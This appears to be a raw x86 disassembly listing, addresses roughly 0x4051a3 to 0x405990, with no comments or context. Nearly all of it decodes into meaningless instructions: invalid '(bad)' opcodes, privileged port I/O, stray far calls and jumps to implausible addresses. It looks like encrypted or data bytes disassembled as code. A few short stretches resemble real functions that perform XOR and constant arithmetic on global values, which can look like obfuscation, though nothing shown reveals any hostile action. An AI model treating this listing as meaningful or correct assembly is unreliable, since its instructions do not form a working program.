  4051a3:	cmp    bl,BYTE PTR [edi]
  4051a5:	into   
  4051a6:	(bad)  
  4051a7:	or     al,0x1
  4051a9:	cld    
  4051aa:	iret   
  4051ab:	aam    0xc1
  4051ad:	aas    
  4051ae:	xor    eax,0xb9e0b677
  4051b3:	sub    al,bh
  4051b5:	test   ah,0x2d
  4051b8:	sar    BYTE PTR [ebx],0x3e
  4051bb:	jne    0x405191
  4051bd:	mov    edx,0xad3224b2
  4051c2:	adc    BYTE PTR [ebx-0x62],bh
  4051c5:	call   0x28f:0x15b35d76
  4051cc:	jo     0x4051f0
  4051ce:	repz push edx
  4051d0:	inc    ebp
  4051d1:	sub    eax,0x3020b544
  4051d6:	es fwait
  4051d8:	pop    eax
  4051d9:	in     al,dx
  4051da:	les    esi,FWORD PTR [edx+0x46f49f95]
  4051e0:	test   eax,0x6c8c1758
  4051e5:	cs (bad) 
  4051e7:	icebp  
  4051e8:	shl    DWORD PTR [esi+0x27dcd6d3],cl
  4051ee:	int3   
  4051ef:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4051f1:	mov    ah,0x9d
  4051f3:	xchg   ecx,eax
  4051f4:	xchg   ebx,eax
  4051f5:	imul   edi,DWORD PTR ds:0x1dff9210,0x4c
  4051fc:	push   eax
  4051fd:	(bad)  
  4051ff:	cs retf 0xaef0
  405203:	cli    
  405204:	push   cs
  405205:	mov    esp,0xf7322473
  40520a:	retf   0x76af
  40520d:	adc    ebp,0xffffffa1
  405210:	sub    al,0xef
  405212:	aad    0x8e
  405214:	lods   al,BYTE PTR ds:[esi]
  405215:	jnp    0x4051e3
  405217:	data16 sbb BYTE PTR [ecx-0x53],al
  40521b:	test   al,0x2c
  40521d:	call   0x98c90203
  405222:	aam    0x4b
  405224:	mov    ds:0x2bd71ed0,al
  405229:	ror    BYTE PTR [edx],cl
  40522b:	jnp    0x4051bb
  40522d:	inc    esp
  40522e:	sub    DWORD PTR [edi+ebp*4],0xffffffbb
  405232:	mov    ch,0x5f
  405234:	scas   eax,DWORD PTR es:[edi]
  405235:	stos   DWORD PTR es:[edi],eax
  405236:	test   eax,0x7e361cfc
  40523b:	jmp    0x405207
  40523d:	mov    esp,0x3acd9363
  405242:	enter  0x3223,0x3
  405246:	adc    eax,0x688223cf
  40524b:	xchg   ecx,eax
  40524c:	xchg   edx,eax
  40524d:	mov    ch,0x9
  40524f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405250:	mov    bl,0x24
  405252:	pop    ebx
  405253:	cmp    dl,cl
  405255:	jmp    0x1dd0c3a3
  40525a:	cld    
  40525b:	repnz mov esp,0x59d31c03
  405261:	xchg   DWORD PTR [eax],edx
  405263:	repz mov WORD PTR [esi-0xd0e81aa],ds
  40526a:	or     esp,DWORD PTR [ecx+0x5f3d1e60]
  405270:	mov    ah,0xac
  405272:	sbb    ecx,ebp
  405274:	mov    al,0x89
  405276:	mov    al,ds:0x691436ef
  40527b:	stos   BYTE PTR es:[edi],al
  40527c:	daa    
  40527d:	cmp    BYTE PTR [eax],bh
  40527f:	fwait
  405280:	mov    esi,0x3fd7cd2d
  405285:	mov    edi,0x45994f24
  40528a:	aaa    
  40528b:	adc    bl,BYTE PTR [esi+eiz*1+0x6f]
  40528f:	dec    esp
  405290:	loope  0x405239
  405292:	scas   eax,DWORD PTR es:[edi]
  405293:	rcl    esp,cl
  405295:	lds    ebp,FWORD PTR [eax-0x6ee2e2cc]
  40529b:	(bad)  
  40529c:	dec    ebx
  40529d:	cs retf 
  40529f:	not    BYTE PTR [eax+0x0]
  4052a2:	iret   
  4052a3:	mov    ss,WORD PTR [edx-0x6be4f98e]
  4052a9:	loopne 0x405303
  4052ab:	nop
  4052ac:	xor    eax,0x2b8ff264
  4052b1:	dec    eax
  4052b2:	xchg   ecx,eax
  4052b3:	pushf  
  4052b4:	cdq    
  4052b5:	mov    ecx,0xdee4d120
  4052ba:	popf   
  4052bb:	push   es
  4052bc:	test   eax,ebx
  4052be:	sub    BYTE PTR [esi+0x7c215d68],bl
  4052c4:	fdivr  QWORD PTR [eax-0x45]
  4052c7:	and    eax,0xa8900cfc
  4052cc:	aas    
  4052cd:	shl    BYTE PTR [ebx-0xfd4d7bc],0xe0
  4052d4:	fdivr  QWORD PTR [ebp+ebp*2+0x3efd1f23]
  4052db:	or     ebp,DWORD PTR [edx-0x794ee561]
  4052e1:	ins    BYTE PTR es:[edi],dx
  4052e2:	push   0x4f4214a9
  4052e7:	adc    cl,BYTE PTR [ebp+0x568e9a5c]
  4052ed:	int3   
  4052ee:	xchg   esi,eax
  4052ef:	inc    edi
  4052f0:	ja     0x405322
  4052f2:	dec    esp
  4052f3:	pop    ds
  4052f4:	loope  0x40534d
  4052f6:	shr    bl,0xf5
  4052f9:	xor    ecx,DWORD PTR [esi]
  4052fb:	adc    al,0xa
  4052fd:	adc    eax,0x389346eb
  405302:	sub    esp,DWORD PTR [edx+0x2486453]
  405308:	pop    esi
  405309:	inc    eax
  40530a:	test   DWORD PTR [edx],ebp
  40530c:	fcmovb st,st(1)
  40530e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40530f:	mov    WORD PTR [ecx],gs
  405311:	in     eax,dx
  405312:	aad    0x31
  405314:	outs   dx,BYTE PTR ds:[esi]
  405315:	repz jmp 0xc76416e8
  40531b:	cs mov edi,0x89c4e179
  405321:	dec    ecx
  405322:	jae    0x405317
  405324:	mov    DWORD PTR [ebx+ebx*2+0x99c3aac],ecx
  40532b:	sbb    edx,ebp
  40532d:	jne    0x4052c9
  40532f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405330:	ror    edx,1
  405332:	xchg   edx,eax
  405333:	ret    0x7e75
  405336:	shl    DWORD PTR [edi-0x38],1
  405339:	mov    dl,0xaa
  40533b:	daa    
  40533c:	or     BYTE PTR [edx+0xf],bl
  40533f:	mov    eax,0xda3dde92
  405344:	xor    ecx,DWORD PTR [edx+0x7a]
  405347:	inc    ebp
  405348:	push   DWORD PTR [eax]
  40534a:	or     ah,BYTE PTR [esi-0x19]
  40534d:	fs idiv ah
  405350:	fist   DWORD PTR [ebp+0x4f]
  405353:	sbb    eax,0xc93a8cdf
  405358:	mov    esp,0x2d0b8c5d
  40535d:	xor    DWORD PTR [ecx+0x26bf76a5],ecx
  405363:	push   edx
  405364:	xchg   ecx,eax
  405365:	sub    eax,0x1fd59c2
  40536a:	aad    0x77
  40536c:	dec    eax
  40536d:	inc    eax
  40536e:	mov    ds,WORD PTR [edx+ebp*2]
  405371:	in     eax,dx
  405372:	stos   BYTE PTR es:[edi],al
  405373:	std    
  405374:	sub    edx,DWORD PTR [edi+0x31]
  405377:	add    ch,BYTE PTR [edx+0x3c]
  40537a:	test   DWORD PTR [ecx-0x4c14209],esi
  405380:	cwde   
  405381:	icebp  
  405382:	jle    0x4053cd
  405384:	cmp    esi,DWORD PTR [ecx+0x20]
  405387:	cmp    ebx,DWORD PTR [esi-0x9b715d1]
  40538d:	test   eax,0x1b18de18
  405392:	pop    es
  405393:	bound  ebx,QWORD PTR [ecx-0x27cd4c44]
  405399:	or     eax,0x12a4a640
  40539e:	dec    edx
  40539f:	or     ah,BYTE PTR [edi]
  4053a1:	enter  0x9426,0xe1
  4053a5:	or     al,0x32
  4053a7:	inc    ecx
  4053a8:	sbb    DWORD PTR [ebx],ebx
  4053aa:	sub    ecx,esp
  4053ac:	adc    DWORD PTR [esi],ebx
  4053ae:	ret    0xf4c4
  4053b1:	pop    esi
  4053b2:	icebp  
  4053b3:	loop   0x405412
  4053b5:	pop    edx
  4053b6:	sub    al,ch
  4053b8:	jnp    0x405369
  4053ba:	inc    esp
  4053bb:	scas   eax,DWORD PTR es:[edi]
  4053bc:	outs   dx,BYTE PTR ds:[esi]
  4053bd:	lods   eax,DWORD PTR ds:[esi]
  4053be:	add    esi,DWORD PTR [ebp-0x6fd37da7]
  4053c4:	add    al,0x45
  4053c6:	div    DWORD PTR ds:0x498296fd
  4053cd:	test   al,0xd4
  4053cf:	xchg   edx,eax
  4053d0:	push   ebx
  4053d1:	in     al,dx
  4053d2:	fiadd  WORD PTR [ecx-0x2ba092dc]
  4053d8:	pop    eax
  4053d9:	inc    esp
  4053da:	add    al,0xcc
  4053dc:	dec    eax
  4053dd:	setle  BYTE PTR [eax-0x70]
  4053e1:	enter  0x920f,0xd3
  4053e5:	xor    eax,0xe58e2197
  4053ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4053eb:	mov    edx,0x51a41cc2
  4053f0:	scas   al,BYTE PTR es:[edi]
  4053f1:	cmp    eax,0x2fc0960
  4053f6:	xchg   ecx,eax
  4053f7:	adc    edx,DWORD PTR [esp+esi*2-0x5aad242]
  4053fe:	nop
  4053ff:	repz pop ecx
  405401:	rcr    DWORD PTR [ecx],cl
  405403:	cmp    BYTE PTR [eax],cl
  405405:	xchg   esi,eax
  405406:	ja     0x405425
  405408:	rcl    BYTE PTR ss:[edx+0x6798201f],1
  40540f:	push   esp
  405410:	aas    
  405411:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405412:	shl    BYTE PTR [esi+0x515e00f4],0x38
  405419:	jb     0x4053a4
  40541b:	arpl   si,bp
  40541d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40541e:	aas    
  40541f:	hlt    
  405420:	push   0x8f245e8e
  405425:	out    dx,al
  405426:	ror    BYTE PTR [eax+0x7f0987c],cl
  40542c:	lea    esi,[esi-0x668b2e4]
  405432:	jle    0x4053e4
  405434:	pop    ebx
  405435:	scas   al,BYTE PTR es:[edi]
  405436:	jge    0x88312821
  40543c:	mov    al,0x40
  40543e:	lock or BYTE PTR [ebp+edi*2+0x5eb4c50d],ah
  405446:	mov    bl,0x99
  405448:	inc    ebx
  405449:	inc    esi
  40544a:	fdivr  st,st(2)
  40544c:	xchg   ecx,eax
  40544d:	daa    
  40544e:	call   0x69f55267
  405453:	cmc    
  405454:	mov    dl,0xe1
  405456:	ret    
  405457:	cmp    ebx,DWORD PTR [ebp-0x401dff4d]
  40545d:	mov    ecx,0x5c073f38
  405462:	push   ecx
  405463:	cmp    edi,edx
  405465:	jbe    0x404ac0
  40546b:	mov    edx,DWORD PTR [ebp-0xc]
  40546e:	mov    edi,DWORD PTR [ebp-0x24]
  405471:	jmp    0x405774
  405476:	outs   dx,DWORD PTR ds:[esi]
  405477:	fisttp QWORD PTR [esi+0x6f6d8cef]
  40547d:	pop    ebp
  40547e:	fmul   QWORD PTR [edi-0x4b830448]
  405484:	popa   
  405485:	pop    esi
  405486:	shr    BYTE PTR [ebx],1
  405488:	jle    0x405508
  40548a:	pop    eax
  40548b:	jl     0x40550b
  40548d:	jle    0x40548e
  40548f:	rol    BYTE PTR [esi],cl
  405491:	push   0x11583809
  405496:	pop    ecx
  405497:	lock sahf 
  405499:	mov    ch,0x50
  40549b:	push   es
  40549c:	nop
  40549d:	cmp    al,0x3a
  40549f:	xor    DWORD PTR [ecx+eax*1],edi
  4054a2:	cmc    
  4054a3:	clc    
  4054a4:	ffreep st(0)
  4054a6:	xchg   BYTE PTR [ebp+0x7f9b4011],al
  4054ac:	call   0x3ee2:0xfa895228
  4054b3:	adc    al,0x3e
  4054b5:	add    eax,DWORD PTR ds:0xa9e5276e
  4054bb:	add    ch,BYTE PTR [esi]
  4054bd:	lea    edx,[ecx+0x5f]
  4054c0:	mov    ds:0x8e4bc872,al
  4054c5:	or     al,0x99
  4054c7:	dec    edi
  4054c8:	inc    ebx
  4054c9:	sbb    ebx,DWORD PTR [ebp-0x29]
  4054cc:	out    0xbe,al
  4054ce:	out    dx,al
  4054cf:	cmp    DWORD PTR [esi-0xf],esp
  4054d2:	or     ch,cl
  4054d4:	iret   
  4054d5:	stos   DWORD PTR es:[edi],eax
  4054d6:	add    eax,0xf75e6c9a
  4054db:	sbb    BYTE PTR [ecx-0x2],dl
  4054de:	sbb    eax,0x18
  4054e1:	bts    DWORD PTR [esi+0x48280d51],edi
  4054e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4054e9:	test   al,0xb4
  4054eb:	out    0x54,eax
  4054ed:	icebp  
  4054ee:	adc    al,0xc
  4054f0:	lods   al,BYTE PTR ds:[esi]
  4054f1:	out    0x8d,al
  4054f3:	ins    BYTE PTR es:[edi],dx
  4054f4:	xchg   ecx,eax
  4054f5:	xor    BYTE PTR [ecx],bh
  4054f7:	pop    ebx
  4054f8:	lods   al,BYTE PTR ds:[esi]
  4054f9:	test   eax,0x746bf4b1
  4054fe:	or     BYTE PTR [ebp+eiz*2+0x1b],ch
  405502:	jnp    0x405505
  405504:	std    
  405505:	cli    
  405506:	jle    0x4054c5
  405508:	mov    WORD PTR [esi-0x500e1ea0],gs
  40550e:	push   edi
  40550f:	jne    0x40555e
  405511:	lods   eax,DWORD PTR ds:[esi]
  405512:	and    BYTE PTR [esi-0x80],0x45
  405516:	adc    ecx,edi
  405518:	sub    al,0xdf
  40551a:	scas   eax,DWORD PTR es:[edi]
  40551b:	pop    edi
  40551c:	shl    DWORD PTR [eax+eiz*2],cl
  40551f:	cmp    eax,0x61529fa
  405524:	dec    ebp
  405525:	ret    
  405526:	les    ebx,FWORD PTR [edx]
  405528:	pop    esp
  405529:	mov    ebp,0xba8d1aff
  40552e:	mov    esp,0x7a7e62bf
  405533:	shl    BYTE PTR [edx+0x6],0x15
  405537:	dec    ebx
  405538:	jmp    0x7bb36702
  40553d:	cdq    
  40553e:	pop    edi
  40553f:	stos   DWORD PTR es:[edi],eax
  405540:	xchg   BYTE PTR [edi+ecx*4-0x39],dl
  405544:	(bad)  
  405545:	cmp    bl,bl
  405547:	adc    BYTE PTR [edi],0x17
  40554a:	pop    eax
  40554b:	fbld   TBYTE PTR [ebx+0x6f]
  40554e:	sub    eax,0x9b14a939
  405553:	adc    BYTE PTR [edx+0x5e],dh
  405556:	nop
  405557:	push   esp
  405558:	mov    ebx,0x71bb4b0b
  40555d:	push   edx
  40555e:	lds    edx,FWORD PTR [esi]
  405560:	adc    eax,0xe71646c
  405565:	xchg   esp,eax
  405566:	test   BYTE PTR [ebx+0x5c74d572],0x78
  40556d:	pop    eax
  40556e:	iret   
  40556f:	jbe    0x4055b0
  405571:	stc    
  405572:	cmc    
  405573:	sub    DWORD PTR [ecx-0x16],0x6620d8f5
  40557a:	(bad)  [esp+eax*8-0x271b30aa]
  405581:	pop    ds
  405582:	dec    ebx
  405583:	mov    ebp,edi
  405585:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405586:	fild   DWORD PTR [edx-0x46]
  405589:	mov    dh,0xa0
  40558b:	inc    BYTE PTR [edi+eiz*4-0x1f]
  40558f:	mov    esi,0x9e62eca3
  405594:	lds    ebp,FWORD PTR [ebx]
  405596:	mov    ds,WORD PTR [ebp-0x4e7fecb5]
  40559c:	idiv   BYTE PTR [ecx+edx*4]
  40559f:	dec    eax
  4055a0:	test   BYTE PTR [ebx],bl
  4055a2:	cmp    ebp,eax
  4055a4:	jb     0x40553c
  4055a6:	cld    
  4055a7:	or     ecx,DWORD PTR [edx-0x4a0043fc]
  4055ad:	pop    esi
  4055ae:	sub    eax,0xbf466e21
  4055b3:	fistp  WORD PTR [edi+edi*4+0x3e]
  4055b7:	push   ecx
  4055b8:	addr16 and eax,0x96234e5a
  4055be:	xchg   edi,eax
  4055bf:	mov    al,ds:0x3e859aa7
  4055c4:	ins    BYTE PTR es:[edi],dx
  4055c5:	loope  0x405564
  4055c7:	inc    edi
  4055c8:	mov    esi,esp
  4055ca:	adc    edi,DWORD PTR [ebx+edx*2]
  4055cd:	ja     0x4055bc
  4055cf:	mov    ah,0x96
  4055d1:	cli    
  4055d2:	int    0x40
  4055d4:	ret    0x338c
  4055d7:	mov    bh,0x6
  4055d9:	adc    ch,ch
  4055db:	push   esi
  4055dc:	jge    0x40556d
  4055de:	mov    eax,ds:0xb09b0160
  4055e3:	sub    dl,bl
  4055e5:	daa    
  4055e6:	or     eax,0xecde8545
  4055eb:	and    DWORD PTR [ebp-0x36],0x180fc6a9
  4055f2:	xor    BYTE PTR [ecx],al
  4055f4:	(bad)  
  4055f6:	es enter 0xda52,0x97
  4055fb:	icebp  
  4055fc:	xor    dl,al
  4055fe:	push   0xffffffbf
  405600:	push   eax
  405601:	mov    ds:0xdf16d41b,eax
  405606:	push   ss
  405607:	jmp    0xc289:0xf77cf0dd
  40560e:	bound  ebx,QWORD PTR [edi+0x3]
  405611:	sahf   
  405612:	push   0x26782be
  405617:	les    esp,FWORD PTR [esi]
  405619:	xchg   edx,eax
  40561a:	fidiv  DWORD PTR [esi+ebx*1]
  40561d:	jmp    0x405600
  40561f:	mov    ah,BYTE PTR [ecx-0xd]
  405622:	and    al,0x5b
  405624:	outs   dx,BYTE PTR ds:[esi]
  405625:	push   ss
  405626:	(bad)  
  405627:	mov    ebp,0x494cbe61
  40562c:	jns    0x40561c
  40562e:	mov    ah,0x39
  405630:	lods   al,BYTE PTR ds:[esi]
  405631:	sub    bh,bh
  405633:	test   ch,dh
  405635:	lea    ecx,[edx+eiz*8]
  405638:	sbb    dl,cl
  40563a:	(bad)  
  40563b:	lods   eax,DWORD PTR ds:[esi]
  40563c:	je     0x4056b7
  40563e:	cwde   
  40563f:	inc    ecx
  405640:	xchg   ebx,eax
  405641:	push   edx
  405642:	cmp    eax,0x400cde4b
  405647:	dec    edi
  405648:	inc    ebx
  405649:	or     al,0x48
  40564b:	pushf  
  40564c:	inc    ebx
  40564d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40564e:	fisttp WORD PTR [edi+0x474b9e9d]
  405654:	push   es
  405655:	je     0x40569e
  405657:	inc    esi
  405658:	sbb    esi,DWORD PTR es:[eax]
  40565b:	push   esp
  40565c:	aaa    
  40565d:	stc    
  40565e:	scas   al,BYTE PTR es:[edi]
  40565f:	cmp    bl,BYTE PTR [ebx]
  405661:	jmp    0x80f07aa
  405666:	mov    edx,0xc07fae68
  40566b:	test   eax,0x8a034a88
  405670:	ins    BYTE PTR es:[edi],dx
  405671:	mov    bh,0x71
  405673:	in     al,0xa5
  405675:	jecxz  0x4056dd
  405677:	or     eax,0x23a1a052
  40567c:	sbb    BYTE PTR [edx-0x6d7d9df0],0xf6
  405683:	popa   
  405684:	not    BYTE PTR [esi-0x22]
  405687:	loopne 0x4056dd
  405689:	movzx  ebx,BYTE PTR [esi-0x7b]
  40568d:	ret    
  40568e:	pop    esi
  40568f:	adc    al,dl
  405691:	push   es
  405692:	stos   DWORD PTR es:[edi],eax
  405693:	js     0x4056a9
  405695:	outs   dx,DWORD PTR ds:[esi]
  405696:	out    dx,eax
  405697:	push   edi
  405698:	fs cs xchg ecx,eax
  40569b:	aas    
  40569c:	outs   dx,BYTE PTR ds:[esi]
  40569d:	xor    eax,0x2687771a
  4056a2:	push   cs
  4056a3:	cs sti 
  4056a5:	add    eax,0xeeb5773f
  4056aa:	pop    ds
  4056ab:	adc    eax,0x95ae26d3
  4056b0:	data16 and dl,BYTE PTR [esi-0x59]
  4056b4:	jecxz  0x405696
  4056b6:	mov    BYTE PTR [edx],dh
  4056b8:	js     0x405732
  4056ba:	mov    dl,0x10
  4056bc:	stos   BYTE PTR es:[edi],al
  4056bd:	mov    al,ds:0x8db971c5
  4056c2:	or     DWORD PTR [eax-0x2999c1d1],ecx
  4056c8:	xlat   BYTE PTR ds:[ebx]
  4056c9:	adc    esp,DWORD PTR [edx]
  4056cb:	in     al,dx
  4056cc:	sbb    ch,BYTE PTR [edx]
  4056ce:	out    0x4c,al
  4056d0:	out    dx,al
  4056d1:	cmp    BYTE PTR [eax],cl
  4056d3:	push   eax
  4056d4:	in     al,0xd1
  4056d6:	push   ss
  4056d7:	mov    esi,0x925c335f
  4056dc:	icebp  
  4056dd:	cdq    
  4056de:	jb     0x405755
  4056e0:	mov    edx,0x411aa638
  4056e5:	sbb    cl,BYTE PTR [esi]
  4056e7:	ins    BYTE PTR es:[edi],dx
  4056e8:	push   ss
  4056e9:	and    al,0xc7
  4056eb:	push   ebx
  4056ec:	hlt    
  4056ed:	cmp    al,0x81
  4056ef:	sub    DWORD PTR [ecx-0x63b21a0f],ecx
  4056f5:	sub    esi,DWORD PTR [ecx+0x594a2d75]
  4056fb:	xchg   esi,eax
  4056fc:	mov    esi,0x23776f41
  405701:	lods   al,BYTE PTR ds:[esi]
  405702:	dec    edi
  405703:	lea    eax,[ebx]
  405705:	outs   dx,DWORD PTR ds:[esi]
  405706:	cmp    al,0x8a
  405708:	jbe    0x4056da
  40570a:	les    ecx,FWORD PTR [ebx+0x27daa315]
  405710:	lock sub DWORD PTR [eax],eax
  405713:	inc    ecx
  405714:	mov    ebx,0xfef65572
  405719:	and    DWORD PTR [edx],0xee08ca1b
  40571f:	stos   DWORD PTR es:[edi],eax
  405720:	test   al,0xce
  405722:	and    BYTE PTR [esi+0x2484b73f],bl
  405728:	mov    bl,0x43
  40572a:	nop
  40572b:	push   ebx
  40572c:	mov    ch,0x34
  40572e:	lods   al,BYTE PTR ds:[esi]
  40572f:	loop   0x405781
  405731:	mov    ebp,esp
  405733:	sub    BYTE PTR [ebx],cl
  405735:	inc    ecx
  405736:	fistp  DWORD PTR [esi+0x2a]
  405739:	outs   dx,DWORD PTR ds:[esi]
  40573a:	inc    ecx
  40573b:	and    BYTE PTR [ecx-0x3137b6b1],0xa4
  405742:	adc    eax,0xe6e7c923
  405747:	jnp    0x4057c3
  405749:	cs mov ecx,0x1cb4db68
  40574f:	push   ds
  405750:	mul    DWORD PTR gs:[ecx+0x4c1c8344]
  405757:	inc    ecx
  405758:	push   cs
  405759:	pop    esp
  40575a:	dec    esi
  40575b:	sub    DWORD PTR [edx],esi
  40575d:	call   0x3e0ea0c8
  405762:	cmp    bl,BYTE PTR [edx+0x6ff7cd55]
  405768:	lods   al,BYTE PTR ds:[esi]
  405769:	adc    al,0x60
  40576b:	cld    
  40576c:	dec    esp
  40576d:	xor    dh,BYTE PTR [ebp-0x538f54c9]
  405773:	div    DWORD PTR [ebx]
  405775:	rol    BYTE PTR [ebx],1
  405777:	ror    DWORD PTR [edi],1
  405779:	scas   eax,DWORD PTR es:[edi]
  40577a:	xlat   BYTE PTR ds:[ebx]
  40577b:	mov    edi,DWORD PTR [ebp-0x18]
  40577e:	xor    edi,eax
  405780:	add    edx,edi
  405782:	mov    edi,DWORD PTR [ebp-0x8]
  405785:	lea    edx,[edx+edi*1+0x32729b]
  40578c:	mov    DWORD PTR [ebp-0x8],edx
  40578f:	mov    edx,DWORD PTR [ebp-0x20]
  405792:	xor    edx,eax
  405794:	mov    edi,0xffcd8d65
  405799:	sub    edi,edx
  40579b:	add    edi,DWORD PTR [ebp-0x10]
  40579e:	mov    edx,DWORD PTR [ebp-0x20]
  4057a1:	mov    ebx,DWORD PTR [ebp-0x8]
  4057a4:	xor    edx,eax
  4057a6:	add    edx,ecx
  4057a8:	imul   edx,ebx
  4057ab:	cmp    edx,edi
  4057ad:	jbe    0x4038ea
  4057b3:	pop    ebx
  4057b4:	pop    edi
  4057b5:	leave  
  4057b6:	ret    0x8
  4057b9:	push   ebp
  4057ba:	mov    ebp,esp
  4057bc:	push   ecx
  4057bd:	mov    ecx,DWORD PTR [ebp+0x8]
  4057c0:	and    eax,DWORD PTR ds:0x43381b
  4057c6:	mov    eax,0x7510854
  4057cb:	xor    DWORD PTR ds:0x433723,0x433703
  4057d5:	xor    ecx,eax
  4057d7:	not    DWORD PTR ds:0x43375f
  4057dd:	add    ecx,0x32729b
  4057e3:	jmp    0x405b32
  4057e8:	scas   eax,DWORD PTR es:[edi]
  4057e9:	inc    BYTE PTR [ebp-0x39]
  4057ec:	jne    0x4057b3
  4057ee:	lods   eax,DWORD PTR ds:[esi]
  4057ef:	jbe    0x4057a1
  4057f1:	loopne 0x4057f0
  4057f3:	mov    al,0x5f
  4057f5:	icebp  
  4057f6:	shl    DWORD PTR [eax],0x3a
  4057f9:	ss jle 0x40587a
  4057fc:	sub    al,0x7d
  4057fe:	jle    0x40587e
  405800:	cmp    edx,DWORD PTR [ebp+0x78]
  405803:	push   edx
  405804:	cmp    BYTE PTR [ebp+0x4b],dl
  405807:	jae    0x405817
  405809:	in     al,0xe
  40580b:	or     al,0xab
  40580d:	push   esp
  40580e:	xchg   esp,eax
  40580f:	mov    eax,ds:0xbbf113cf
  405814:	jbe    0x4057ec
  405816:	pop    edi
  405817:	sar    BYTE PTR [edi],1
  405819:	xchg   ecx,eax
  40581a:	and    ch,BYTE PTR [ebp+0x775b129f]
  405820:	pop    esi
  405821:	popf   
  405822:	cmp    eax,0x974d05c6
  405827:	inc    ebx
  405828:	cwde   
  405829:	iret   
  40582a:	mov    ecx,0x2c4940e8
  40582f:	dec    eax
  405830:	adc    al,0x21
  405832:	mov    ds:0x1b8e4d9d,eax
  405837:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405838:	mov    ebx,DWORD PTR [esi]
  40583a:	stos   DWORD PTR es:[edi],eax
  40583b:	mov    al,ds:0x46884cd6
  405840:	sbb    eax,0xa60ba904
  405845:	fisttp QWORD PTR [eax+ebp*8+0x7]
  405849:	loope  0x40581c
  40584b:	outs   dx,DWORD PTR ds:[esi]
  40584c:	shl    DWORD PTR [edi+ebx*1+0x59],cl
  405850:	rcl    BYTE PTR fs:[esi+0x3cb4be1e],1
  405857:	cli    
  405858:	jb     0x40583d
  40585a:	sub    al,0x84
  40585c:	test   eax,0x9982fc1
  405861:	or     cl,dl
  405863:	push   ebp
  405864:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405866:	push   esp
  405867:	xor    al,0x9b
  405869:	int3   
  40586a:	call   0x6f79:0x408775f
  405871:	ss jae 0x4058eb
  405874:	aas    
  405875:	enter  0xd487,0x4f
  405879:	xchg   ebx,eax
  40587a:	mov    esi,0x11025a20
  40587f:	mov    ds:0xb96ed321,eax
  405884:	inc    DWORD PTR [esp+ebx*2-0x56add4ec]
  40588b:	push   esi
  40588c:	(bad)  
  40588d:	pop    ss
  40588e:	fst    QWORD PTR [ebx+0x4e456848]
  405894:	mov    ds:0x491c28fe,al
  405899:	test   DWORD PTR [ecx],0x24aa999e
  40589f:	hlt    
  4058a0:	ret    
  4058a1:	mov    eax,ebp
  4058a3:	push   esi
  4058a4:	pop    ebp
  4058a5:	mov    ebx,0x269dc72d
  4058aa:	xchg   DWORD PTR [esi-0x14],ecx
  4058ad:	push   es
  4058ae:	sub    al,0x32
  4058b0:	lock jg 0x4058d0
  4058b3:	rcl    BYTE PTR [eax-0x6a697114],cl
  4058b9:	ret    0x1065
  4058bc:	mov    eax,0xe7f11796
  4058c1:	dec    ecx
  4058c2:	cli    
  4058c3:	shl    dl,1
  4058c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4058c6:	or     ah,BYTE PTR [ebp+0x6441a138]
  4058cc:	das    
  4058cd:	add    bh,BYTE PTR [ebp-0x3562558e]
  4058d3:	add    edi,edx
  4058d5:	addr16 and dh,bh
  4058d8:	cdq    
  4058d9:	and    eax,0x37f00699
  4058de:	and    ah,BYTE PTR [ecx+0x69]
  4058e1:	pop    edx
  4058e2:	fwait
  4058e3:	dec    edi
  4058e4:	outs   dx,DWORD PTR ds:[esi]
  4058e5:	enter  0x6f71,0xef
  4058e9:	inc    esi
  4058ea:	mov    ds:0xf5923020,eax
  4058ef:	pop    esp
  4058f0:	add    eax,0x87a198ef
  4058f5:	pop    ecx
  4058f6:	in     al,0x41
  4058f8:	nop
  4058f9:	xchg   edi,eax
  4058fa:	fild   WORD PTR [ebp+0x2c]
  4058fd:	xchg   ebp,eax
  4058fe:	dec    ebp
  4058ff:	ficom  WORD PTR ds:0xf7095ae7
  405905:	or     al,0x55
  405907:	adc    eax,0xdf89fee7
  40590c:	sti    
  40590d:	test   BYTE PTR [edi+edx*2+0x695519f2],cl
  405914:	jle    0x4058b3
  405916:	mov    ch,0x68
  405918:	ins    BYTE PTR es:[edi],dx
  405919:	shl    DWORD PTR [edx-0x43],cl
  40591c:	add    al,0x8
  40591e:	xchg   ebp,eax
  40591f:	jecxz  0x405937
  405921:	jmp    0x6cd5055f
  405926:	mov    al,ds:0x81d80e3a
  40592b:	(bad)  
  40592d:	or     BYTE PTR [edx+esi*1],ah
  405930:	lock mov edx,0x9a447a8a
  405936:	call   0x8508ba31
  40593b:	mov    bh,0x41
  40593d:	xlat   BYTE PTR ds:[ebx]
  40593e:	in     al,dx
  40593f:	jl     0x4058f4
  405941:	push   esp
  405942:	cwde   
  405943:	iret   
  405944:	je     0x4058f5
  405946:	sub    BYTE PTR [eax+0x60],dh
  405949:	push   eax
  40594a:	addr16 sbb al,0xbb
  40594d:	jg     0x40599a
  40594f:	(bad)  
  405950:	inc    esi
  405951:	xchg   ebp,eax
  405952:	or     eax,0x4b64e0ee
  405957:	push   esp
  405958:	and    eax,0xa1c24204
  40595d:	or     dh,ch
  40595f:	sub    ah,al
  405961:	loope  0x4059e2
  405963:	stc    
  405964:	pop    edi
  405965:	xor    eax,0x1e2d4e1b
  40596a:	jle    0x405947
  40596c:	test   al,0x9b
  40596e:	mov    DWORD PTR [eax-0x31],esp
  405971:	jo     0x405966
  405973:	mov    WORD PTR [eax+0x26b57628],cs
  405979:	cmp    BYTE PTR [edx],0x8b
  40597c:	adc    DWORD PTR [eax+0x2e53c128],0x5a13c8c2
  405986:	inc    ebx
  405987:	imul   eax,DWORD PTR [ecx-0x43],0x7f
  40598b:	and    ch,BYTE PTR [ecx-0x1b]
  40598e:	lods   al,BYTE PTR ds:[esi]
  40598f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405990:	out    0xaa,eax
